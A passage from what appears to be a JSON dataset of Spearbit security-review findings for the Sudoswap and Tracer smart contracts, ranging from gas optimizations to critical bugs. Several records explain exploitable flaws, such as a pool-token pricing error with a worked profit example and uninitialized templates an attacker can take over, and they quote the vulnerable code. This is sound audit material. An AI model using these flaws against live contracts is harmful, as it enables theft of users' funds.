        "body": "Strings are used to encode error messages. With the current Solidity versions it is possible to replace them with custom errors, which are more gas efcient. Example of non-custom errors used in LSSVM : LSSVMRouter.sol#L604 require(block.timestamp <= deadline, \"Deadline passed\"); LSSVMRouter.sol#L788 require(outputAmount >= minOutput, \"outputAmount too low\"); Note: This pattern has been used in Ownable.sol#L6-L7",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Alternatives for the immutable Proxy variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "In the current LSSVMPairClone, the immutable variables stored in the proxy are sent along with every call. It may be possible to optimize this. 37",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pair implementations may not be Proxies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The security of function pairTransferERC20From() relies on is- Pair(). In turn, isPair() relies on both isETHPairClone() and isERC20PairClone(). These functions check that a valid proxy is used with a valid implementation ad- dress. However, if the implementation address itself is a proxy it could link to any other contract. In this case security could be undermined depending on the implementation details. This is not how the protocol is designed, but future developers or developers using a fork of the code might not be aware of this.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "NFT and Token Pools can be signed orders instead",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Currently if any actor wants to create a buy/sell order they would have to create a new pool and pay gas for it. However, the advantage of this is unclear. TOKEN and NFT type pools can really be buy/sell orders at a price curve using signed data. This is reminiscent of how similar limit orders implemented by OpenSea, 1Inch, and SushiSwap currently function. Amending this in the codebase would make creating buy/sell orders free and should attract more liquidity and/or orders to Sudoswap.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove Code Duplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions like swapTokenForAnyNFTs and swapTokenForSpeci- ficNFTs are nearly identical and can be deduplicated by creating a common internal function. On the other hand this will slightly increase gas usage due to an extra jump.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear Function Name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The functions _validateTokenInput() of both LSSVMPairETH and LSSVMPairERC20 do not only validate the token input but also transfer ETH/ERC20. The function name does not reasonably imply this and therefore can create some confusion. 40 abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(...) ... { ... _assetRecipient.safeTransferETH(inputAmount); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(...) ... { ... if (isRouter) { ... router.pairTransferERC20From(...); // transfer of tokens ... } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate Message About MAX_FEE",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The function initialize() of LSSVMPair has an error message containing less than 100%. This is likely an error and should probably be less than 90%, as in the changeFee() function and because MAX_FEE == 90%. 41 // 90%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 9e17; function initialize(..., uint256 _fee, ...) external payable { ... require(_fee < MAX_FEE, \"Trade fee must be less than 100%\"); // 100% should be 90% ... ,! } function changeFee(uint256 newFee) external onlyOwner { ... require(newFee < MAX_FEE, \"Trade fee must be less than 90%\"); ... }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate comment for assetRecipientNFTBalanceAtTransferStart",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The comment in LSSVMPair notes that assetRecipientNFTBal- anceAtTransferStart is 0; however, in routerSwapNFTsForToken() the variable assetRecipientNFTBalanceAtTransferStart is set to 1. As such, the below comment is probably inaccurate. // Temporarily used during LSSVMRouter::_swapNFTsForToken to store the number of NFTs transferred ,! // directly to the pair. Should be 0 outside of the execution of routerSwapAnyNFTsForToken. ,! uint256 internal `assetRecipientNFTBalanceAtTransferStart`; function routerSwapNFTsForToken(address payable tokenRecipient) ... { ... assetRecipientNFTBalanceAtTransferStart = 1; ... } 42",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "IERC1155 not utilized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPair references IERC1155, but does not utilitze the interface within LSSVMPair.sol. import {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\"; The struct TokenToTokenTrade is dened in LSSVMRouter, but the contract does not utilize the interface either. struct TokenToTokenTrade { PairSwapSpecific[] tokenToNFTTrades; PairSwapSpecific[] nftToTokenTrades; } It is better to remove unused code due to potential confusion.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Fractions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "In some occasions percentages are indicated in a number format ending in e17. It is also possible to use fractions of e18. Considering e18 is the standard base format, using fractions might be easier to read. 43 LSSVMPairFactory.sol#L28 LSSVMPair.sol#L25",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two families of token libraries used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The Sudoswap contract imports token libraries from both Open- Zeppelin and Solmate. If Sudoswap sticks within one library family, then it will not be necessary to track potential issues from two separate families of libraries.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool token price is incorrect when there is more than one pending upkeep",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X. However, in the current implementation price includes the current total supply but burn commits burn pool tokens immediately when commit() is called, not when upkeep() is executed. // pool token price computation at execution of updateIntervalId, example for long price priceHistory[updateIntervalId].longPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount + _totalCommit[updateIntervalId].longBurnShortMintAmount) ,! The implementation tries to fix this by adding back all tokens burned at this updateIntervalId but it must also add back all tokens that were burned in future commits (i.e. when ID > updateIntervalID). This issue allows an attacker to get a better pool token price and steal pool token funds. Example: Given the preconditions:  long.totalSupply() = 2000  User owns 1000 long pool tokens  lastPriceTimestamp = 100  updateInterval = 10  frontRunningInterval = 5 At time 104: User commits to BurnLong 500 tokens in appropriateUpdateIntervalId = 5. Upon execution user receives a long price of longBalance / (1500 + 500) if no further future commitments are made. Then, as tokens are burned totalPoolCommitments[5].longBurnAmount = 500 and long.totalSupply -= 500. time 106: At 6 as they are now past totalPoolCommitments[6].longBurnAmount = 500, long.totalSupply -= 500 again as tokens are burned. User commits another 500 tokens to BurnLong at appropriateUpdateIntervalId = Now the frontRunningInterval and are scheduled for the next update. the 5th update interval Finally, (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCom- mit[5].longBurnShortMintAmount = longBalance / (1000 + 500) which is a better price than what the user should have received. ID is executed by the pool keeper but at longPrice = longBalance / With a longBalance of 2000, the user receives 500 * (2000 / 1500) = 666.67 tokens executing the first burn commit and 500 * ((2000 - 666.67) / 1500) = 444.43 tokens executing the second one. 5 The total pool balance received by the user is 1111.1/2000 = 55.555% by burning only 1000 / 2000 = 50% of the pool token supply.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Critical"
        ]
    },
    {
        "title": "No price scaling in SMAOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The update() function of the SMAOracle contract doesnt scale the latestPrice although a scaler is set in the constructor. On the other hand, the _latestRoundData() function of ChainlinkOracleWrapper contract does scale via toWad(). contract SMAOracle is IOracleWrapper { constructor(..., uint256 _spotDecimals, ...) { ... require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); ... /* `scaler` is always <= 10^18 and >= 1 so this cast is safe */ scaler = int256(10**(MAX_DECIMALS - _spotDecimals)); ... } function update() internal returns (int256) { /* query the underlying spot price oracle */ IOracleWrapper spotOracle = IOracleWrapper(oracle); int256 latestPrice = spotOracle.getPrice(); ... priceObserver.add(latestPrice); // doesn't scale latestPrice ... } contract ChainlinkOracleWrapper is IOracleWrapper { function getPrice() external view override returns (int256) { (int256 _price, ) = _latestRoundData(); return _price; } function _latestRoundData() internal view returns (int256, uint80) { (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData(); ... return (toWad(price), ...); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Two different invariantCheck variables used in PoolFactory.deployPool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool() function in the PoolFactory contract uses two different invariantCheck vari- ables: the one defined as a contracts instance variable and the one supplied as a parameter. Note: This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\". function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... poolCommitter.initialize(..., ,! invariantCheck deploymentParameters.invariantCheck, ... ); // version 1 of ... ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({ ... _invariantCheckContract: invariantCheck, // version 2 of invariantCheck ... });",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Duplicate user payments for long commits when paid from balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Initial executionPrice is too high",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When a pool is deployed the initial executionPrice is calculated as firstPrice * 1e18 where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice(): contract PoolKeeper is IPoolKeeper, Ownable { function newPool(address _poolAddress) external override onlyFactory { int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice(); int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), ,! FIXED_POINT)); executionPrice[_poolAddress] = startingPrice; } } All other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling: function performUpkeepSinglePool() { ... (int256 latestPrice, ...) = pool.getUpkeepInformation(); ... executionPrice[_pool] = latestPrice; ... } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function getUpkeepInformation() { (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata(); return (_latestPrice, ...); } } The price after the firstPrice will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Paused state cant be set and therefore withdrawQuote() cant be executed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The checkInvariants() function of the InvariantCheck contract is called via the modifiers check- InvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommit- ter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The aforementioned modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheck- Contract modifier. Thus the paused variable will never be set to true, making withdrawQuote() impossible to be executed because it requires the contract to be paused. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked. Relevant parts of the code: The checkInvariants() function calls InvariantCheck.pause() if the invariants dont hold. The latter calls pause() in LeveragedPool and PoolCommitter: contract InvariantCheck is IInvariantCheck { function checkInvariants(address poolToCheck) external override { ... pause(IPausable(poolToCheck), IPausable(address(poolCommitter))); ... } function pause(IPausable pool, IPausable poolCommitter) internal { pool.pause(); poolCommitter.pause(); } } In LeveragedPool and PoolCommitter contracts, the checkInvariantsBeforeFunction() and checkIn- variantsAfterFunction() modifiers will make the transaction revert if checkInvariants() sets the paused state. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external override onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); } ,! } 9 contract PoolCommitter is IPoolCommitter, Initializable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The performUpkeepSinglePool() function of the PoolKeeper contract updates executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, pool.poolUpkeep() can revert, for example due to the checkInvariantsBeforeFunction modifier in mintTokens(). If pool.poolUpkeep() reverts then the previous price value is lost and the processing will not be accurate. There- fore, it is safer to store the new price only if pool.poolUpkeep() has been executed succesfully. function performUpkeepSinglePool(...) public override { ... int256 lastExecutionPrice = executionPrice[_pool]; executionPrice[_pool] = latestPrice; ... try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) { // previous price can get lost if poolUpkeep() reverts ... // executionPrice[_pool] should be updated here } catch Error(string memory reason) { ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pools can be deployed with malicious or incorrect quote tokens and oracles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployment of a pool via deployPool() is permissionless. The deployer provides several pa- rameters that have to be trusted by the users of a specific pool, these parameters include:  oracleWrapper  settlementEthOracle  quoteToken  invariantCheck If any one of them is malicious, then the pool and its value will be affected. Note: Separate findings are made for the deployer check (issue Authenticity check for oracles is not effective) and the invariantCheck (issue Two different invariantCheck variables used in PoolFactory.deployPool() ).",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "pairTokenBase and poolBase template contracts instances are not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The constructor of PoolFactory contract creates three template contract instances but only one is initialized: poolCommitterBase. The other two contract instances (pairTokenBase and poolBase) are not initial- ized. contract PoolFactory is IPoolFactory, Ownable { constructor(address _feeReceiver) { ... PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized pairTokenBaseAddress = address(pairTokenBase); LeveragedPool poolBase = new LeveragedPool(); // not initialized poolBaseAddress = address(poolBase); PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized poolCommitterBaseAddress = address(poolCommitterBase); ... /* initialise base PoolCommitter template (with dummy values) */ poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0); } This means an attacker can initialize the templates setting them as the owner, and perform owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens. In PoolToken.initialize() an attacker can become the owner by calling initialize() with an address under his control as a parameter. The same can happen in LeveragedPool.initialize() with the initialization parameter. 13 contract PoolToken is ERC20_Cloneable, IPoolToken { ... } contract ERC20_Cloneable is ERC20, Initializable { function initialize(address _pool, ) external initializer { // not called for the template contract owner = _pool; ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! // not called for the template contract ... // set the owner of the pool. This is governance when deployed from the factory governance = initialization._owner; } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Oracles are not updated before use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The PoolKeeper contract uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getPendingCommits() underreports commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When frontRunningInterval > updateInterval, the PoolCommitter.getAppropriateUpdateIntervalId() function can return updateInterval IDs that are arbitrarily far into the future, especially if appropriateIntervalId > updateIntervalId + 1. Therefore, commits can also be made to these appropriate interval IDs far in the future by calling commit(). The PoolCommitter.getPendingCommits() function only checks the commits for updateIntervalId and updateIn- tervalId + 1, but needs to check up to updateIntervalId + factorDifference + 1. Currently, it is underreporting the pending commits which leads to the checkInvariants function not checking the correct values.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Authenticity check for oracles is not effective",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. As the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. Note: this check does protect against frontrunning the deployment transaction of the same pool. See Undocu- mented frontrunning protection. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\");",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect calculation of keeper reward",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The keeper reward is calculated as (keeperGas * tipPercent / 100) / 1e18. The division by 1e18 is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. This in turn will call executeCommitments() repeatedly. For each call to executeCommitments() the updateMintingFee() function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling executeCommitments() with boundedIntervals == true and numberOfIntervals == 0. Note: Also see issue It is not possible to call executeCommitments() for multiple old commits. It is also important that lastPriceTimestamp is only updated after the last executeCommitments(), otherwise it will revert. 17 function executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override ,! onlyPool { ... uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max; ... while (i < upperBound) { if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) { // ,! lastPriceTimestamp shouldn't be updated too soon ... } } ... updateMintingFee(); // should do this once (in combination with _boundedIntervals==true) ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "It is not possible to call executeCommitments() for multiple old commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. In this context the following problem occurs:  In the first run of poolUpkeep(), lastPriceTimestamp will be set to block.timestamp.  In the next run of poolUpkeep(), processing will stop at require(intervalPassed(),..), because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId, which is updated in executeCommitments(), will start lagging. 18 function poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override ,! onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); // next time lastPriceTimestamp == ,! block.timestamp executePriceChange(_oldPrice, _newPrice); // should only to this once (in combination with ,! _boundedIntervals==true) IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); lastPriceTimestamp = block.timestamp; // shouldn't update until all executeCommitments() are ,! processed } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect comparison in getUpdatedAggregateBalance()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "When the value of data.updateIntervalId accidentally happens to be larger data.currentUpdateIntervalId in the getUpdatedAggregateBalance() function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely it is also very easy to prevent. function getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) { if (data.updateIntervalId == data.currentUpdateIntervalId) { // Update interval has not passed: No change return (0, 0, 0, 0, 0); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "updateAggregateBalance() can run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateAggregateBalance() function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The updateAggregateBalance() function checks all future intervals every time it is called and adds them back to the unAggregatedCommitments array, which is checked in the next function call. This would only be a problem if frontRunningInterval is much larger than updateInterval, a situation that seems unlikely in practice. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... uint256[] memory currentIntervalIds = unAggregatedCommitments[user]; uint256 unAggregatedLength = currentIntervalIds.length; for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; ... UserCommitment memory commitment = userCommitments[user][id]; ... if (commitment.updateIntervalId < updateIntervalId) { ... } else { ... storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays ,! in array } } delete unAggregatedCommitments[user]; unAggregatedCommitments[user] = storageArrayPlaceHolder; ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool information might be lost if setFactory() of PoolKeeper contract is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The PoolKeeper contract has a function to change the factory: setFactory(). However, calling this function will make previous pools inaccessible for this PoolKeeper unless the new factory imports the pools from the old factory. The isUpkeepRequiredSinglePool() function calls factory.isValidPool(_pool), and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail. function setFactory(address _factory) external override onlyOwner { factory = IPoolFactory(_factory); ... } function isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) { if (!factory.isValidPool(_pool)) { // might not work if factory is changed return false; } ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ether could be lost when calling commit()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The commit() function sends the supplied ETH to makePaidClaimRequest() only if payForClaim == true. If the caller of commit() accidentally sends ETH when payForClaim == false then the ETH stays in the PoolCommitter contract and is effectively lost. Note: This was also documented in Secureums CARE Tracking function commit(...) external payable override checkInvariantsAfterFunction { ... if (payForClaim) { autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Race condition if PoolFactory deploy pools before fees are set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The deployPool function of PoolFactory contract can deploy pools before the changeInterval value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the mintingFee, burningFee and changeInterval values arent clear. In some parts of the code < 1e18 is used, and in other parts <= 1e18. Furthermore, the initialize() function of the PoolCommitter contract doesnt check the value of changeInter- val. The setBurningFee(), setMintingFee() and setChangeInterval() functions of PoolCommitter contract dont check the new values. Finally, two representations of 1e18 are used: 1e18 and PoolSwapLibrary.WAD_PRECISION. contract PoolFactory is IPoolFactory, Ownable { function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... { ... require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); mintingFee = _mintingFee; burningFee = _burningFee; changeInterval = _changeInterval; ... } function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ,! ... // no check that mintingFee, burningFee, changeInterval are set poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...); } } 22 contract PoolCommitter is IPoolCommitter, Initializable { function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... { ... require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); ... // no check on _changeInterval mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); ... } function setBurningFee(uint256 _burningFee) external override onlyGov { burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee ... } function setMintingFee(uint256 _mintingFee) external override onlyGov { mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee ... } function setChangeInterval(uint256 _changeInterval) external override onlyGov { changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on ,! _changeInterval ... } function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private { ... if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) { // mintingFee is greater than 1 (100%). // We want to cap this at a theoretical max of 100% mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18 } } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Committer not validated on withdraw claim and multi-paid claim",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "AutoClaim checks that the committer creating the claim request in makePaidClaimRequest and withdrawing the claim request in withdrawUserClaimRequest is a valid committer for the PoolFactory used in theAutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some SMAOracle and AutoClaim state variables can be declared as immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In the SMAOracle contract, the oracle, periods, observer, scaler and updateInterval state vari- ables are not declared as immutable. In the AutoClaim contract, the poolFactory state variable is not declared as immutable. Since the mentioned variables are only initialized in the contracts constructors, they can be declared as immutable in order to save gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use of counters can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "counter and i are both used as counters for the same loop. uint32 counter = 1; uint256 i = 0; ... while (i < upperBound) { ... unchecked { counter += 1; } i++; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "transferOwnership() function is inaccessible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
